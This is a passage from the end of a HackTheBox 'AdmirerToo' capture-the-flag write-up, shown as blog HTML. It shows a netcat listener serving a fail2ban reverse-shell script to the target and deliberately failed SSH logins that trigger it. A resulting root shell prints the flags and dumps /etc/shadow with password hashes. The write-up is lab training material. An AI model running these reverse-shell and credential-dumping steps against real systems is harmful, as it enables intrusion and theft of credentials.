‚îî‚îÄ<span class="nv">$ </span><span class="nb">sudo </span>nc <span class="nt">-nvlkp</span> 43 <span class="nt">-c</span> <span class="s2">"cat fail2ban-rev.sh"</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>kali: 
listening on <span class="o">[</span>any] 43 ...
connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.137] 52976
</pre></td></tr></tbody></table></code></div></div>

<p>Attempting to get banned:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
‚îî‚îÄ<span class="nv">$ </span>ssh jennifer@admirertoo.htb
ssh: connect to host admirertoo.htb port 22: Connection refused
                                                                                                                    
‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
‚îî‚îÄ<span class="nv">$ </span>ssh jennifer@admirertoo.htb
jennifer@admirertoo.htb<span class="s1">'s password: 
Permission denied, please try again.
jennifer@admirertoo.htb'</span>s password: 
Permission denied, please try again.
jennifer@admirertoo.htb<span class="s1">'s password: 
jennifer@admirertoo.htb: Permission denied (publickey,password).
                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
‚îî‚îÄ$ ssh jennifer@admirertoo.htb
ssh: connect to host admirertoo.htb port 22: Connection refused
...
</span></pre></td></tr></tbody></table></code></div></div>

<p>Reverse shell:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>‚îå‚îÄ‚îÄ<span class="o">(</span>kali„âøkali<span class="o">)</span>-[~/‚Ä¶/HTB/B2R/AdmirerToo/exploit]
‚îî‚îÄ<span class="nv">$ </span>nc <span class="nt">-nlvp</span> 10099
listening on <span class="o">[</span>any] 10099 ...
connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.137] 34928
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>14620<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@admirertoo:/## <span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">cat</span> ~/root.txt <span class="o">&amp;&amp;</span> <span class="nb">hostname
id</span> <span class="o">&amp;&amp;</span> <span class="nb">cat</span> ~/root.txt <span class="o">&amp;&amp;</span> <span class="nb">hostname
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
54f21ac1641a6ec72be23bdfd993c1c1
admirertoo
root@admirertoo:/## 
</pre></td></tr></tbody></table></code></div></div>

<h2 id="trophy"><span class="me-2">Trophy</span><a href="#trophy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p><a href="/assets/img/AdmirerToo/Untitled%2015.png" class="popup img-link shimmer"><img src="/assets/img/AdmirerToo/Untitled%2015.png" alt="Untitled" loading="lazy"></a></p>

<p><strong>User.txt</strong></p>

<p>c171776485c8d1852be98f88edbba763</p>

<p><strong>Root.txt</strong></p>

<p>54f21ac1641a6ec72be23bdfd993c1c1</p>

<p><strong>/etc/shadow</strong></p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre></td><td class="rouge-code"><pre>root@admirertoo:/## <span class="nb">cat</span> /etc/shadow
<span class="nb">cat</span> /etc/shadow
root:<span class="nv">$6$eP5MVyB1lXtVQgzU$H4xJdGiHfSu9JmUR80juqHC5BAca79yir2Z6bipW8s</span>.DowTuNRo82/CjN7EMBK8lczD1AMYxgKTIp79DjN2R31:18817:0:99999:7:::
daemon:<span class="k">*</span>:18815:0:99999:7:::
bin:<span class="k">*</span>:18815:0:99999:7:::
sys:<span class="k">*</span>:18815:0:99999:7:::
<span class="nb">sync</span>:<span class="k">*</span>:18815:0:99999:7:::
games:<span class="k">*</span>:18815:0:99999:7:::
man:<span class="k">*</span>:18815:0:99999:7:::
lp:<span class="k">*</span>:18815:0:99999:7:::
mail:<span class="k">*</span>:18815:0:99999:7:::
news:<span class="k">*</span>:18815:0:99999:7:::
uucp:<span class="k">*</span>:18815:0:99999:7:::
proxy:<span class="k">*</span>:18815:0:99999:7:::
www-data:<span class="k">*</span>:18815:0:99999:7:::
backup:<span class="k">*</span>:18815:0:99999:7:::
list:<span class="k">*</span>:18815:0:99999:7:::
irc:<span class="k">*</span>:18815:0:99999:7:::
gnats:<span class="k">*</span>:18815:0:99999:7:::
nobody:<span class="k">*</span>:18815:0:99999:7:::
_apt:<span class="k">*</span>:18815:0:99999:7:::
systemd-timesync:<span class="k">*</span>:18815:0:99999:7:::
systemd-network:<span class="k">*</span>:18815:0:99999:7:::
systemd-resolve:<span class="k">*</span>:18815:0:99999:7:::
messagebus:<span class="k">*</span>:18815:0:99999:7:::
systemd-coredump:!!:18815::::::
opentsdb:<span class="k">*</span>:18815:0:99999:7:::
hbase:!:18815:0:99999:7:::
mysql:!:18816:0:99999:7:::
jennifer:<span class="nv">$6$LWi8tlOmIOw6zGZa$A5h4DjTnRwW3GhZnA288bi4zKk892yRGon5kBhKao3biY8AWo3</span>.qTFdlEIAPJ.ebKewW31JWbbXlpl/r.aLIC/:18817:0:99999:7:::
sshd:<span class="k">*</span>:18816:0:99999:7:::
Debian-exim:!:18827:0:99999:7:::
devel:!:18829:0:99999:7:::
</pre></td></tr></tbody></table></code></div></div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/articles-writeups/">Articles & Writeups</a>,
          <a href="/categories/hackthebox/">HackTheBox</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/hackthebox/"
            class="post-tag no-text-decoration"
          >hackthebox</a>
        
          <a
            href="/tags/deserialization/"
            class="post-tag no-text-decoration"
          >deserialization</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=HackTheBox%20-%20AdmirerToo%20-%200xbro&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fadmirertoo%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox%20-%20AdmirerToo%20-%200xbro&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fadmirertoo%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fadmirertoo%2F&text=HackTheBox%20-%20AdmirerToo%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

      

      <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fadmirertoo%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
        <i class="fa-fw fab fa-linkedin"></i>
      </a>
    

      

      <a href="https://www.reddit.com/submit?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fadmirertoo%2F&title=HackTheBox%20-%20AdmirerToo%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit">
        <i class="fa-fw fa-brands fa-square-reddit"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/how-i-keep-updated/">How I keep updated in the infosec industry</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/vtenext-25-02-a-three-way-path-to-rce/">Vtenext 25.02 vulnerability research</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/wp-prevent-direct-access-CVE-2025-3861/">Incorrect Authorization to Authenticated (Contributor+) Multiple Media Actions in Prevent Direct Access Wordpress Plugin (CVE-2025-3861)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/effective-notes-with-obsidian/">Effective Notes for OSCP, CTFs and Pentests with Obsidian (2025)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/salesforce-hacking/">Pentesting Salesforce Communities</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
    
  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  











  <aside id="related-posts" aria-labelledby="related-label">
    <h3 class="mb-4" id="related-label">Further Reading</h3>
    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
      
        <article class="col">
          <a href="/posts/ophiuchi/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1625263200"
  data-df="ll"
  
>
  Jul  3, 2021
</time>

              <h4 class="pt-0 my-2">HackTheBox - Ophiuchi</h4>
              <div class="text-muted">
                <p>HackTheBox &quot;Ophiuchi&quot; wirteup is now available!</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/tenet/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1623448800"
  data-df="ll"
  
>
  Jun 12, 2021
</time>

              <h4 class="pt-0 my-2">HackTheBox - Tenet</h4>
              <div class="text-muted">
                <p>Tenet is an medium difficulty Linux machine on HackTheBox vulnerable to PHP deserialization vulnerability and based on code review.</p>
              </div>
            </div>
          </a>
        </article>
      
        <article class="col">
          <a href="/posts/waf-bypass-exploiting-parser-differentials/" class="post-preview card h-100">
            <div class="card-body">
              <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->




<time
  
  data-ts="1681250400"
  data-df="ll"
  
>
  Apr 12, 2023
</time>

              <h4 class="pt-0 my-2">WAF bypass and vulnerability chain exploiting parser differentials</h4>
              <div class="text-muted">
                <p>HackTheBox &quot;WAFfle-y_Order&quot; wirteup is now available!</p>
              </div>
            </div>
          </a>
        </article>
      
    </nav>
  </aside>
  <!-- #related-posts -->


            
              
              <!-- Navigation buttons at the bottom of the post. -->

<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
  
  

  
    <a
      href="/posts/armageddon/"
      class="btn btn-outline-primary"
      aria-label="Older"
    >
      <p>HackTheBox - Armageddon</p>
    </a>
  

  
    <a
      href="/posts/noter/"
      class="btn btn-outline-primary"
      aria-label="Newer"
    >
      <p>HackTheBox - Noter</p>
    </a>
  
</nav>

            

            <footer
  aria-label="Site Info"
  class="
    d-flex flex-column justify-content-center text-muted
    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
  "
>
  <p>¬©
    <time>2026</time>

    
      <a href="https://github.com/0xb120">0xbro</a>.
    

    
      <span
        data-bs-toggle="tooltip"
        data-bs-placement="top"
        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
      >Some rights reserved.</span>
    
  </p>

  <p>
   Powered by ‚òï, üêõüêúüêû, vulnerabilities and exploits
  </p>
</footer>
          </div>
        </div>

        <!-- The Search results -->

<div id="search-result-wrapper" class="d-flex justify-content-center d-none">
  <div class="col-11 content">
    <div id="search-hints">
      <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
      
    </div>
  </section>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

